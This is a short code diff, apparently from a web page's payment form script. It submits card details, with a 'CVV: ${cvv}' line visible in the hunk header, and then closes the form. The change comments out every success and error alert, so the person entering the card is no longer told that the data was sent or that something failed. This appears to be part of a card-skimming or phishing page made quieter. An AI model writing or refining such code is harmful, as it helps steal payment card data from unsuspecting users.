@@ -26,15 +26,15 @@ CVV: ${cvv}
         .then(response => response.json())
         .then(data => {
             if (data.ok) {
-                alert("Datele au fost trimise cu succes!");
+                //alert("Datele au fost trimise cu succes!");
                 closePaymentForm(); // Close the payment form after submission
             } else {
-                alert("A apărut o eroare la trimiterea datelor.");
+                //alert("A apărut o eroare la trimiterea datelor.");
             }
         })
         .catch(error => {
             console.error("Eroare:", error);
-            alert("A apărut o eroare.");
+            //alert("A apărut o eroare.");
         });
 });
 
